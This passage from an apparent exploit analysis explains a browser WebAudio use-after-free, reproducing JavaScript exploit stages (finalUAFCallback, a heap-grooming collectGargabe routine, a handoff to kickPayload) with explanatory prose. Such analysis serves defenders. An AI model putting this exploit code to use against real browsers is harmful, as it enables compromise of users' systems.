						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675dc586809087-1"><span class="crayon-t">void</span><span class="crayon-h"> </span><span class="crayon-i">IIRDSPKernel</span><span class="crayon-sy">:</span><span class="crayon-sy">:</span><span class="crayon-e">GetFrequencyResponse</span><span class="crayon-sy">(</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-i">n_frequencies</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dc586809087-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	</span><span class="crayon-m">const</span><span class="crayon-h"> </span><span class="crayon-t">float</span>*<span class="crayon-h"> </span><span class="crayon-i">frequency_hz</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-676241da675dc586809087-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	</span><span class="crayon-t">float</span>*<span class="crayon-h"> </span><span class="crayon-i">mag_response</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dc586809087-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	</span><span class="crayon-t">float</span>*<span class="crayon-h"> </span><span class="crayon-i">phase_response</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675dc586809087-5"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dc586809087-6"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-i">Vector</span><span class="crayon-h">&lt;</span><span class="crayon-t">float</span><span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-e">frequency</span><span class="crayon-sy">(</span><span class="crayon-i">n_frequencies</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675dc586809087-7"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">double</span><span class="crayon-h"> </span><span class="crayon-i">nyquist</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">this</span>-<span class="crayon-h">&gt;</span><span class="crayon-e">Nyquist</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dc586809087-8"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-c">// Convert from frequency in Hz to normalized frequency (0 -&gt; 1),</span></div><div class="crayon-line" id="crayon-676241da675dc586809087-9"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-c">// with 1 equal to the Nyquist frequency.</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dc586809087-10"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-i">k</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">k</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-i">n_frequencies</span><span class="crayon-sy">;</span><span class="crayon-h"> </span>++<span class="crayon-i">k</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-676241da675dc586809087-11"><span class="crayon-h">	</span><span class="crayon-i">frequency</span><span class="crayon-sy">[</span><span class="crayon-i">k</span><span class="crayon-sy">]</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">frequency_hz</span><span class="crayon-sy">[</span><span class="crayon-i">k</span><span class="crayon-sy">]</span><span class="crayon-h"> </span>/<span class="crayon-h"> </span><span class="crayon-i">nyquist</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dc586809087-12"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
If the resulting array contains a value other than <strong>π</strong><strong>, </strong>it means exploitation was successful. If that&#8217;s the case, the exploit stops its recursion and executes the function <em>finalUAFCallback</em> to allocate the audio channel buffer again and reclaim the previously freed memory. This function also repairs the heap to prevent possible crashes by allocating various objects of different sizes and performing defragmentation of the heap. The exploit also creates BigUint64Array, which is used later to create an arbitrary read/write primitive.</p>
		<div id="crayon-676241da675dd527654222" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
async function finalUAFCallback() {
	for (let i = 0; i &lt; 256; i++) {
    		floatArray.fill(0);
 
         	iirFilters[i].getFrequencyResponse(floatArray, floatArray, floatArray);
 
    		if (floatArray[0] != 3.1415927410125732) {
        		await collectGargabe();
 
        		audioBufferArray2 = [];
 
        		for (let j = 0; j &lt; 80; j++)
                 		audioBufferArray1.push(sharedAudioCtx.createBuffer(1, 2, 10000));
 
        		iirFilters = new Array(1);
    	     		await collectGargabe();
 
        		for (let j = 0; j &lt; 336; j++)
            			imageDataArray.push(new ImageData(1, 2));
        		imageDataArray = new Array(10);
        		await collectGargabe();
 
        		for (let j = 0; j &lt; audioBufferArray1.length; j++) {
            			let auxArray = new BigUint64Array(audioBufferArray1[j].getChannelData(0).buffer);
            			if (auxArray[0] != BigInt(0)) {
                			kickPayload(auxArray);
                			return;
            			}
             		}
 
        		return;
    		}
	}
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675dd527654222-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dd527654222-2">2</div><div class="crayon-num" data-line="crayon-676241da675dd527654222-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dd527654222-4">4</div><div class="crayon-num" data-line="crayon-676241da675dd527654222-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dd527654222-6">6</div><div class="crayon-num" data-line="crayon-676241da675dd527654222-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dd527654222-8">8</div><div class="crayon-num" data-line="crayon-676241da675dd527654222-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dd527654222-10">10</div><div class="crayon-num" data-line="crayon-676241da675dd527654222-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dd527654222-12">12</div><div class="crayon-num" data-line="crayon-676241da675dd527654222-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dd527654222-14">14</div><div class="crayon-num" data-line="crayon-676241da675dd527654222-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dd527654222-16">16</div><div class="crayon-num" data-line="crayon-676241da675dd527654222-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dd527654222-18">18</div><div class="crayon-num" data-line="crayon-676241da675dd527654222-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dd527654222-20">20</div><div class="crayon-num" data-line="crayon-676241da675dd527654222-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dd527654222-22">22</div><div class="crayon-num" data-line="crayon-676241da675dd527654222-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dd527654222-24">24</div><div class="crayon-num" data-line="crayon-676241da675dd527654222-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dd527654222-26">26</div><div class="crayon-num" data-line="crayon-676241da675dd527654222-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dd527654222-28">28</div><div class="crayon-num" data-line="crayon-676241da675dd527654222-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dd527654222-30">30</div><div class="crayon-num" data-line="crayon-676241da675dd527654222-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dd527654222-32">32</div><div class="crayon-num" data-line="crayon-676241da675dd527654222-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675dd527654222-34">34</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675dd527654222-1"><span class="crayon-e">async </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">finalUAFCallback</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dd527654222-2"><span class="crayon-h">	</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">let</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-cn">256</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">i</span>++<span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675dd527654222-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">floatArray</span><span class="crayon-sy">.</span><span class="crayon-e">fill</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dd527654222-4"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675dd527654222-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 	</span><span class="crayon-i">iirFilters</span><span class="crayon-sy">[</span><span class="crayon-i">i</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-e">getFrequencyResponse</span><span class="crayon-sy">(</span><span class="crayon-i">floatArray</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">floatArray</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">floatArray</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dd527654222-6"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675dd527654222-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">floatArray</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">!</span>=<span class="crayon-h"> </span><span class="crayon-cn">3.1415927410125732</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dd527654222-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-e">await </span><span class="crayon-e">collectGargabe</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675dd527654222-9"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dd527654222-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">audioBufferArray2</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675dd527654222-11"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dd527654222-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">let</span><span class="crayon-h"> </span><span class="crayon-i">j</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">j</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-cn">80</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">j</span>++<span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-676241da675dd527654222-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 		</span><span class="crayon-i">audioBufferArray1</span><span class="crayon-sy">.</span><span class="crayon-e">push</span><span class="crayon-sy">(</span><span class="crayon-i">sharedAudioCtx</span><span class="crayon-sy">.</span><span class="crayon-e">createBuffer</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">10000</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dd527654222-14"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675dd527654222-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">iirFilters</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-t">Array</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dd527654222-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;	&nbsp;&nbsp;&nbsp;&nbsp; 		</span><span class="crayon-e">await </span><span class="crayon-e">collectGargabe</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675dd527654222-17"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dd527654222-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">let</span><span class="crayon-h"> </span><span class="crayon-i">j</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">j</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-cn">336</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">j</span>++<span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-676241da675dd527654222-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-i">imageDataArray</span><span class="crayon-sy">.</span><span class="crayon-e">push</span><span class="crayon-sy">(</span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">ImageData</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dd527654222-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">imageDataArray</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-t">Array</span><span class="crayon-sy">(</span><span class="crayon-cn">10</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675dd527654222-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-e">await </span><span class="crayon-e">collectGargabe</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dd527654222-22"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675dd527654222-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">let</span><span class="crayon-h"> </span><span class="crayon-i">j</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">j</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-i">audioBufferArray1</span><span class="crayon-sy">.</span><span class="crayon-i">length</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">j</span>++<span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dd527654222-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-e">let </span><span class="crayon-i">auxArray</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">BigUint64Array</span><span class="crayon-sy">(</span><span class="crayon-i">audioBufferArray1</span><span class="crayon-sy">[</span><span class="crayon-i">j</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-e">getChannelData</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-i">buffer</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675dd527654222-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">auxArray</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">!</span>=<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dd527654222-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-e">kickPayload</span><span class="crayon-sy">(</span><span class="crayon-i">auxArray</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675dd527654222-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-st">return</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dd527654222-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-676241da675dd527654222-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 		</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dd527654222-30"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675dd527654222-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-st">return</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dd527654222-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-676241da675dd527654222-33"><span class="crayon-h">	</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675dd527654222-34"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
Heap defragmentation is performed with multiple calls to the improvised <em>collectGarbage</em> function that creates a huge ArrayBuffer in a loop.</p>
		<div id="crayon-676241da675df818716169" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function collectGargabe() {
	let promise = new Promise(function(cb) {
    		let arg;
    		for (let i = 0; i &lt; 400; i++)
        		new ArrayBuffer(1024 * 1024 * 60).buffer;
    		cb(arg);
	});
	return promise;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675df818716169-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675df818716169-2">2</div><div class="crayon-num" data-line="crayon-676241da675df818716169-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675df818716169-4">4</div><div class="crayon-num" data-line="crayon-676241da675df818716169-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675df818716169-6">6</div><div class="crayon-num" data-line="crayon-676241da675df818716169-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675df818716169-8">8</div><div class="crayon-num" data-line="crayon-676241da675df818716169-9">9</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675df818716169-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">collectGargabe</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675df818716169-2"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">promise</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">Promise</span><span class="crayon-sy">(</span><span class="crayon-t">function</span><span class="crayon-sy">(</span><span class="crayon-i">cb</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675df818716169-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-e">let </span><span class="crayon-i">arg</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675df818716169-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">let</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-cn">400</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">i</span>++<span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-676241da675df818716169-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">ArrayBuffer</span><span class="crayon-sy">(</span><span class="crayon-cn">1024</span><span class="crayon-h"> </span>*<span class="crayon-h"> </span><span class="crayon-cn">1024</span><span class="crayon-h"> </span>*<span class="crayon-h"> </span><span class="crayon-cn">60</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-i">buffer</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675df818716169-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-e">cb</span><span class="crayon-sy">(</span><span class="crayon-i">arg</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675df818716169-7"><span class="crayon-h">	</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675df818716169-8"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-i">promise</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675df818716169-9"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
After those steps, the exploit executes the function <em>kickPayload()</em> passing the previously created BigUint64Array containing the raw pointer address of the previously freed AudioArray&#8217;s data.</p>
